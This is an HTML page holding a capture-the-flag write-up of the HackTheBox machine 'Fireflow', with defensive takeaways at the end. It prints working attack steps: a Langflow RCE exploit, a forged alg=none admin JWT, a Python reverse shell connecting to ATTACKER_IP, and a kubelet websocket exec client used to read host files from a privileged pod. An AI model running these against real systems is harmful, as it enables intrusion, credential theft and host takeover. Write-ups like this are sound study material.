@@ -1,0 +1,343 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<meta name="theme-color" content="#030305"/>
+<title>Fireflow - HTB Write Up | pumkin</title>
+<meta name="description" content="HackTheBox Fireflow (Medium, Linux) full write up: Langflow unauthenticated RCE -&gt; leaked credentials -&gt; JWT algorithm confusion -&gt; Kubernetes nodes/proxy -&gt; privileged pod root."/>
+<link rel="icon" href="../cat.png"/>
+<style>
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+:root{--bg:#030305;--panel-bg:rgba(255,255,255,.03);--border:rgba(255,255,255,.06);--rose:#a855f7;--rose-dim:rgba(168,85,247,.15);--emerald:#34d399;--emerald-dim:rgba(52,211,153,.1);--text:#fafafa;--muted:#9ca3af;--dim:#6b7280}
+body{background:var(--bg);color:var(--text);font-family:'Inter',system-ui,-apple-system,sans-serif;min-height:100vh;overflow-x:hidden;position:relative}
+body::before{content:'';position:fixed;inset:0;background:linear-gradient(rgba(255,255,255,.015) 1px,transparent 1px),linear-gradient(90deg,rgba(255,255,255,.015) 1px,transparent 1px);background-size:60px 60px;z-index:0;pointer-events:none}
+.cyber-grid{position:fixed;inset:0;z-index:0;pointer-events:none;overflow:hidden}
+.cyber-grid::before{content:'';position:absolute;width:100%;height:100%;background:radial-gradient(circle at 50% 0%,rgba(168,85,247,.08) 0%,transparent 50%),radial-gradient(circle at 80% 80%,rgba(52,211,153,.04) 0%,transparent 50%)}
+main{position:relative;z-index:1;min-height:100vh;width:100%;padding:2rem 1rem}
+@media(min-width:768px){main{padding:3rem 2rem}}
+.max-w{max-width:72rem;width:100%;margin:0 auto}
+.nav-row{display:flex;align-items:center;gap:1rem;margin-bottom:2rem;flex-wrap:wrap}
+.back-btn{display:inline-flex;align-items:center;gap:.5rem;padding:.5rem 1rem;border-radius:.75rem;background:var(--panel-bg);border:1px solid var(--border);color:var(--muted);text-decoration:none;font-family:'JetBrains Mono','Fira Code',monospace;font-size:.75rem;text-transform:uppercase;letter-spacing:.1em;transition:all .3s ease}
+.back-btn:hover{color:#c084fc;border-color:rgba(168,85,247,.5)}
+.back-btn svg{transition:transform .3s ease}
+.back-btn:hover svg{transform:translateX(-4px)}
+.panel{background:#0a0b0f;border:1px solid var(--border);border-radius:1rem;position:relative;overflow:hidden}
+.writeup-body{padding:2rem;max-width:60rem;margin:0 auto}
+@media(min-width:768px){.writeup-body{padding:3rem}}
+.meta{color:var(--dim);font-size:.75rem;font-family:'JetBrains Mono','Fira Code',monospace;letter-spacing:.1em;text-transform:uppercase;margin-bottom:1rem}
+h1{font-size:1.75rem;font-weight:800;letter-spacing:-.03em;color:white;text-transform:uppercase;margin-bottom:1.5rem}
+@media(min-width:768px){h1{font-size:2.5rem}}
+.writeup-body h2{font-size:1.25rem;font-weight:700;color:#c084fc;margin:2.5rem 0 1rem;padding-bottom:.5rem;border-bottom:1px solid var(--border)}
+.writeup-body h3{font-size:1rem;font-weight:700;color:#34d399;margin:1.5rem 0 .75rem}
+.writeup-body p{color:var(--muted);font-size:.95rem;line-height:1.75;margin-bottom:1rem}
+.writeup-body ul,.writeup-body ol{color:var(--muted);font-size:.95rem;line-height:1.75;margin:0 0 1rem 1.25rem}
+.writeup-body li{margin-bottom:.25rem}
+.writeup-body strong{color:var(--text)}
+.writeup-body code{font-family:'JetBrains Mono','Fira Code',monospace;font-size:.85rem;background:rgba(168,85,247,.1);color:#c084fc;padding:2px 6px;border-radius:6px}
+.writeup-body pre{background:rgba(0,0,0,.5);border:1px solid var(--border);border-radius:.75rem;padding:1rem;margin:1rem 0;font-family:'JetBrains Mono','Fira Code',monospace;font-size:.8rem;color:var(--emerald);line-height:1.6;white-space:pre-wrap;word-wrap:break-word;overflow-wrap:anywhere}
+.writeup-body pre code{background:none;color:inherit;padding:0;border-radius:0}
+.section-tag{display:inline-block;padding:2px 10px;border-radius:9999px;font-size:.7rem;font-family:'JetBrains Mono','Fira Code',monospace;letter-spacing:.1em;text-transform:uppercase}
+.tag-medium{background:rgba(251,191,36,.1);border:1px solid rgba(251,191,36,.3);color:#fbbf24}
+.tag-linux{background:rgba(52,211,153,.1);border:1px solid rgba(52,211,153,.3);color:#34d399}
+.info-grid{display:grid;grid-template-columns:1fr;gap:.75rem;margin:1rem 0}
+@media(min-width:768px){.info-grid{grid-template-columns:repeat(3,1fr)}}
+.info-cell{background:rgba(0,0,0,.3);border:1px solid var(--border);border-radius:.75rem;padding:1rem}
+.info-cell .lbl{color:var(--dim);font-size:.65rem;font-family:'JetBrains Mono','Fira Code',monospace;text-transform:uppercase;letter-spacing:.1em;margin-bottom:.25rem}
+.info-cell .val{color:var(--text);font-size:.9rem;font-weight:600}
+.footer{text-align:center;padding-top:3rem;color:var(--dim);font-size:10px;font-family:'JetBrains Mono','Fira Code',monospace;letter-spacing:.15em;text-transform:uppercase}
+.fade-in{opacity:0;transform:translateY(20px);transition:opacity .6s ease,transform .6s ease}
+.fade-in.visible{opacity:1;transform:translateY(0)}
+</style>
+</head>
+<body>
+<div class="cyber-grid"></div>
+
+<main>
+<div class="max-w">
+  <div class="nav-row fade-in">
+    <a href="../writeups.html" class="back-btn">
+      <svg class="icon-sm" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m12 19-7-7 7-7"/><path d="M19 12H5"/></svg>
+      Write Ups
+    </a>
+    <a href="../index.html" class="back-btn">Home</a>
+  </div>
+
+  <div class="panel fade-in">
+    <div class="writeup-body">
+
+      <p class="meta">hackthebox / medium / linux</p>
+      <h1>Fireflow</h1>
+
+      <div class="info-grid">
+        <div class="info-cell"><div class="lbl">Platform</div><div class="val">HackTheBox</div></div>
+        <div class="info-cell"><div class="lbl">Difficulty</div><div class="val"><span class="section-tag tag-medium">Medium</span></div></div>
+        <div class="info-cell"><div class="lbl">OS</div><div class="val"><span class="section-tag tag-linux">Linux</span></div></div>
+      </div>
+
+      <h2>Summary</h2>
+      <p>Fireflow is a medium Linux box that chains an exposed <strong>Langflow</strong> instance with a poorly secured internal MCP service. A public playground reveals <code>flow.fireflow.htb</code> and a valid flow ID, which is enough to trigger <strong>CVE-2026-33017</strong> for a shell as <code>www-data</code>. Langflow environment variables expose a password that gives SSH access, and a hidden <code>.mcp/config.json</code> file provides credentials for the internal MCP tool registry. The registry accepts unsigned JWTs, allowing us to register a Python tool and obtain a shell as <code>mcp</code>. Its Kubernetes service account can query <code>nodes/proxy</code>, which reaches a kubelet and lets us execute commands inside a privileged node-exporter pod. The host filesystem is mounted at <code>/host</code>, giving us the root flag.</p>
+
+      <h2>Skills Required</h2>
+      <ul>
+        <li>Subdomain and virtual host enumeration</li>
+        <li>JWT and Kubernetes API fundamentals</li>
+        <li>Basic Python and reverse-shell usage</li>
+      </ul>
+
+      <h2>Skills Learned</h2>
+      <ul>
+        <li>Exploiting Langflow unauthenticated RCE (CVE-2026-33017)</li>
+        <li>Abusing JWT <code>alg=none</code> acceptance and role claims</li>
+        <li>Using <code>SelfSubjectRulesReview</code> to enumerate Kubernetes RBAC permissions</li>
+        <li>Using <code>nodes/proxy</code> and the kubelet exec websocket against a privileged pod</li>
+      </ul>
+
+      <pre>Fireflow - Root Path
+|
++-- 1. flow.fireflow.htb playground
+|     `-- valid flow_id -> Langflow CVE-2026-33017 -> www-data
+|
++-- 2. Langflow environment
+|     `-- reused password -> SSH user -> user.txt
+|
++-- 3. .mcp/config.json
+|     `-- MCP credentials -> JWT alg=none + role=admin -> mcp shell
+|
++-- 4. Kubernetes service account
+|     `-- nodes/proxy -> kubelet -> privileged node-exporter pod
+|           `-- /host/root/root/root.txt -> root.txt</pre>
+
+      <h2>Enumeration</h2>
+      <p>A full port scan reveals SSH and HTTPS. The TLS certificate identifies <code>fireflow.htb</code> and its wildcard subdomain.</p>
+      <pre>Starting Nmap 7.98 ( https://nmap.org ) at 2026-07-11 06:30 -0400
+Nmap scan report for 10.129.46.84
+Host is up (0.044s latency).
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.16
+443/tcp open  ssl/http nginx
+|_http-title: Did not follow redirect to https://fireflow.htb/
+| ssl-cert: Subject: commonName=fireflow.htb/organizationName=Task Force Nightfall/countryName=US
+| Subject Alternative Name: DNS:fireflow.htb, DNS:*.fireflow.htb</pre>
+      <p>Add the main host to <code>/etc/hosts</code> before starting web enumeration.</p>
+      <pre>10.129.46.84 fireflow.htb flow.fireflow.htb</pre>
+      <p>SMB, LDAP and WinRM are absent. Directory enumeration against the main site is unremarkable, but virtual host fuzzing finds a new host:</p>
+      <pre>flow                    [Status: 200, Size: 1142, Words: 132, Lines: 25, Duration: 71ms]</pre>
+
+      <h2>Foothold</h2>
+      <h3>Flow playground and Langflow</h3>
+      <p>The <strong>Open Agent</strong> button redirects to a playground on the new vhost:</p>
+      <pre>https://flow.fireflow.htb/playground/7d84d636-af65-42e4-ac38-26e867052c25</pre>
+      <p>The UUID-like value is a valid <code>flow_id</code>. The application is running <strong>Langflow 1.8.2</strong>, and the playground confirms that the service exposes a flow-building API.</p>
+
+      <h3>Langflow unauthenticated RCE - CVE-2026-33017</h3>
+      <p>Langflow exposes <code>/api/v1/build_public_tmp/{flow_id}/flow</code> for previewing flows. The endpoint does not require authentication and passes attacker-controlled Python to <code>exec()</code> without sandboxing. A valid flow ID is the only prerequisite.</p>
+      <pre>git clone https://github.com/EQSTLab/CVE-2026-33017.git
+cd CVE-2026-33017</pre>
+      <p>The target uses HTTPS with a certificate that is not trusted by the exploit's default client. In <code>send_payload()</code>, disable certificate verification before sending the request:</p>
+      <pre># send_payload() request
+requests.post(url, json=payload, verify=False)</pre>
+      <p>Start a listener, run the PoC with the discovered <code>flow_id</code>, and catch a reverse shell as <code>www-data</code>.</p>
+      <pre>nc -lvnp 4444
+
+# exploit output
+uid=33(www-data) gid=33(www-data) groups=33(www-data)</pre>
+
+      <h2>Lateral Movement</h2>
+      <h3>Langflow environment -&gt; SSH</h3>
+      <p>The process environment contains the Langflow superuser password and secret key:</p>
+      <pre>env | grep -i langflow
+
+LANGFLOW_SUPERUSER_PASSWORD=n1ghtm4r3_b4_n1ghtf4ll
+LANGFLOW_SECRET_KEY=XgDCYma6JZzT3XXyePTbr4vgWrrZ4Vzz-PCQ4PXfKgE</pre>
+      <p>The superuser password is reused for SSH. Log in as the local Langflow account and read the user flag.</p>
+      <pre>ssh &lt;langflow_user&gt;@fireflow.htb
+cat user.txt</pre>
+
+      <h3>MCP credentials</h3>
+      <p>Hidden files in the user's home directory reveal an MCP configuration:</p>
+      <pre>cat ~/.mcp/config.json
+
+{
+  "server": "http://10.129.83.233:30080",
+  "status_endpoint": "/api/v1/version",
+  "user": "langflow-bot",
+  "password": "Langfl0w@mcp2026!"
+}</pre>
+      <p>The service identifies itself as an MCP AI Tool Registry.</p>
+      <pre>curl http://10.129.83.233:30080/api/v1/version | python3 -m json.tool
+
+{
+    "service": "MCP AI Tool Registry",
+    "version": "0.1.0",
+    "auth": {
+        "type": "JWT",
+        "header": "Authorization: Bearer &lt;token&gt;",
+        "supported_algorithms": ["HS256", "none"]
+    },
+    "docs": "/docs",
+    "endpoints": [
+        "POST /mcp",
+        "POST /api/v1/auth",
+        "GET  /api/v1/tools",
+        "POST /api/v1/tools               [admin]"
+    ]
+}</pre>
+
+      <h3>Unsigned JWT -&gt; MCP admin</h3>
+      <p>Authenticate with the leaked credentials to receive a JWT:</p>
+      <pre>curl -X POST http://10.129.83.233:30080/api/v1/auth \
+  -H "Content-Type: application/json" \
+  -d '{"username":"langflow-bot", "password":"Langfl0w@mcp2026!"}' | python3 -m json.tool</pre>
+      <p>Decoding the first two JWT segments shows a normal user token:</p>
+      <pre>{"alg":"HS256","typ":"JWT"}
+{"sub":"langflow-bot","role":"user"}</pre>
+      <p>The version endpoint explicitly lists <code>none</code> as a supported algorithm. Change the header to <code>alg=none</code>, change the role claim to <code>admin</code>, and keep the existing signature segment. The forged header and payload are:</p>
+      <pre>eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJsYW5nZmxvdy1ib3QiLCJyb2xlIjoiYWRtaW4ifQ</pre>
+      <p>Use the modified token to register tools. First confirm administrative access with a harmless <code>id</code> tool:</p>
+      <pre>export ADMIN_TOKEN='eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJsYW5nZmxvdy1ib3QiLCJyb2xlIjoiYWRtaW4ifQ.RenGdHutrKPCOWjwYSJex8C_uMSmy7I8AMkhmTwf9Ps'
+
+curl -X POST http://10.129.83.233:30080/api/v1/tools \
+  -H "Content-Type: application/json" \
+  -H "Authorization: Bearer $ADMIN_TOKEN" \
+  -d '{"name":"id", "description":"test", "code":"id"}'
+
+{"status":"registered","name":"id"}</pre>
+
+      <h3>MCP tool to shell</h3>
+      <p>Register a Python reverse shell as another tool:</p>
+      <pre>curl -X POST http://10.129.83.233:30080/api/v1/tools \
+  -H "Content-Type: application/json" \
+  -H "Authorization: Bearer $ADMIN_TOKEN" \
+  -d '{"name":"shell", "description":"reverse shell", "code":"import socket,os,pty\npid=os.fork()\nif pid&gt;0:\n import sys;sys.exit(0)\nos.setsid()\npid=os.fork()\nif pid&gt;0:\n import sys;sys.exit(1)\ns=socket.socket()\ns.connect((\"ATTACKER_IP\",4444))\n[os.dup2(s.fileno(),i) for i in(0,1,2)]\npty.spawn(\"/bin/sh\")"}'</pre>
+      <p>Start a listener and invoke the tool through the JSON-RPC <code>/mcp</code> endpoint:</p>
+      <pre>nc -lvnp 4444
+
+curl -X POST http://10.129.83.233:30080/mcp \
+  -H "Content-Type: application/json" \
+  -H "Authorization: Bearer $ADMIN_TOKEN" \
+  -d '{"jsonrpc":"2.0","id":4,"method":"tools/call","params":{"name":"shell","arguments":{}}}'
+
+{"jsonrpc":"2.0","id":4,"result":{"content":[{"type":"text","text":""}],"isError":false}}</pre>
+      <p>The callback lands as the <code>mcp</code> user.</p>
+
+      <h2>Privilege Escalation</h2>
+      <h3>Kubernetes service account</h3>
+      <p>The MCP process runs inside Kubernetes. The pod-mounted service account files and environment variables identify the API server:</p>
+      <pre>env | grep -i kubernetes
+
+KUBERNETES_SERVICE_HOST=10.43.0.1
+KUBERNETES_SERVICE_PORT=443
+PWD=/var/run/secrets/kubernetes.io/serviceaccount
+
+ls /var/run/secrets/kubernetes.io/serviceaccount
+ca.crt  namespace  token</pre>
+      <p>Without a token, the API server returns <code>401 Unauthorized</code>. Use the mounted token to query the service account's own RBAC rules with <code>SelfSubjectRulesReview</code>:</p>
+      <pre>export KUBE_TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+export KUBE_API=https://10.43.0.1:443
+
+curl -ks "$KUBE_API/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" \
+  -H "Authorization: Bearer $KUBE_TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"default"}}' | python3 -m json.tool</pre>
+      <p>The relevant permission is:</p>
+      <pre>"verbs": ["get"],
+"apiGroups": [""],
+"resources": ["nodes/proxy"]</pre>
+
+      <h3><code>nodes/proxy</code> to kubelet</h3>
+      <p><code>nodes/proxy</code> is a Kubernetes subresource that proxies requests to a node's kubelet. The kubelet exposes pod metadata and command execution on port <code>10250</code>. Query the pod list and filter for containers running with <code>privileged: true</code>:</p>
+      <pre>export NODE=10.129.83.233
+
+curl -ks "https://$NODE:10250/pods" \
+  -H "Authorization: Bearer $KUBE_TOKEN" | python3 -c '
+import sys, json
+data = json.load(sys.stdin)
+for pod in data.get("items", []):
+    for container in pod.get("spec", {}).get("containers", []):
+        if container.get("securityContext", {}).get("privileged", False):
+            print(f"{pod['metadata']['namespace']}/{pod['metadata']['name']}")
+            break
+'
+
+monitoring/prometheus-prometheus-node-exporter-nmntq</pre>
+      <p>The <code>node-exporter</code> container is privileged and mounts the host filesystem at <code>/host</code>.</p>
+
+      <h3>Kubelet websocket exec</h3>
+      <p>The kubelet exec endpoint uses a websocket and the <code>v4.channel.k8s.io</code> subprotocol. Save a small client as <code>/tmp/kube_exec.py</code>:</p>
+      <pre>#!/usr/bin/env python3
+import asyncio
+import ssl
+import sys
+import websockets
+
+NODE = "10.129.83.233"
+POD_NS = "monitoring"
+POD = "prometheus-prometheus-node-exporter-nmntq"
+CONTAINER = "node-exporter"
+TOKEN = open("/var/run/secrets/kubernetes.io/serviceaccount/token").read().strip()
+COMMAND = sys.argv[1] if len(sys.argv) &gt; 1 else "id"
+
+async def ws_exec(cmd_parts):
+    ctx = ssl.create_default_context()
+    ctx.check_hostname = False
+    ctx.verify_mode = ssl.CERT_NONE
+    args = "&amp;".join(f"command={part}" for part in cmd_parts)
+    url = (f"wss://{NODE}:10250/exec/{POD_NS}/{POD}/{CONTAINER}"
+           f"?output=1&amp;error=1&amp;{args}")
+    async with websockets.connect(
+        url,
+        ssl=ctx,
+        additional_headers={"Authorization": f"Bearer {TOKEN}"},
+        subprotocols=["v4.channel.k8s.io"],
+        open_timeout=10,
+    ) as ws:
+        try:
+            while True:
+                data = await asyncio.wait_for(ws.recv(), timeout=5)
+                if isinstance(data, bytes) and len(data) &gt; 1:
+                    sys.stdout.write(data[1:].decode("utf-8", errors="replace"))
+                    sys.stdout.flush()
+        except (asyncio.TimeoutError, websockets.exceptions.ConnectionClosed):
+            pass
+
+asyncio.run(ws_exec(COMMAND.split()))</pre>
+      <p>Running commands directly under <code>/root</code> returns nothing because that path belongs to the container. The host root is available below <code>/host</code>:</p>
+      <pre>python3 /tmp/kube_exec.py "id"
+# uid=0(root) gid=0(root)
+
+python3 /tmp/kube_exec.py "cat /root/root.txt"
+# empty
+
+python3 /tmp/kube_exec.py "cat /host/root/root/root.txt"
+# root flag</pre>
+
+      <h2>Key Takeaways</h2>
+      <ul>
+        <li><strong>Development playgrounds expose attack primitives</strong> - a public Langflow flow ID was enough to reach an unauthenticated execution endpoint.</li>
+        <li><strong>Environment variables and hidden config files deserve equal attention</strong> - they provided both SSH and MCP credentials.</li>
+        <li><strong>JWT algorithm allowlists must be enforced</strong> - accepting <code>none</code> let a user token become an admin token.</li>
+        <li><strong>RBAC permissions need least privilege</strong> - <code>nodes/proxy</code> exposed kubelet access from a service account.</li>
+        <li><strong>Privileged containers are host compromise</strong> - the node-exporter pod exposed the host root filesystem at <code>/host</code>.</li>
+      </ul>
+
+    </div>
+  </div>
+
+  <p class="footer">pumkin / write ups</p>
+</div>
+</main>
+
+<script>
+const observer = new IntersectionObserver((entries) => {
+  entries.forEach(entry => {
+    if (entry.isIntersecting) {
+      entry.target.classList.add('visible');
+    }
+  });
+}, { threshold: 0 });
+
+document.querySelectorAll('.fade-in').forEach(el => observer.observe(el));
+</script>
+</body>
+</html>
